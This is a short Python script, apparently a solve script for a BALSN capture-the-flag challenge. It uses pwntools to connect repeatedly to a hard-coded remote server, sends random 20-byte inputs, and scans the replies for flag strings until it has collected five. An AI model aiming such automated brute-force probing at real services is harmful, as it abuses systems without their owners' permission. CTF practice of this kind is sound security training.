from pwn import *
import os
from subprocess import *
import re


flags = set()

sh = remote('140.112.31.97', '10160')
t0 = time.time()


while len(flags) < 5:
    for j in range(50):
        if time.time() - t0 > 40:
            sh.close()
            sh = remote('140.112.31.97', '10160')
            t0 = time.time()
        
        current = os.urandom(20)
        try:
            sh.send(current)
            k = sh.recv().split()
        except KeyboardInterrupt:
            exit()
        except:
            continue

        for i in k:
            flag = re.search("BALSN{(.*?)}", str(i))
            if flag:
                flag = flag.group(0)
                if flag not in flags:
                    flags.add(flag)
                    print(i)
        

print(flags)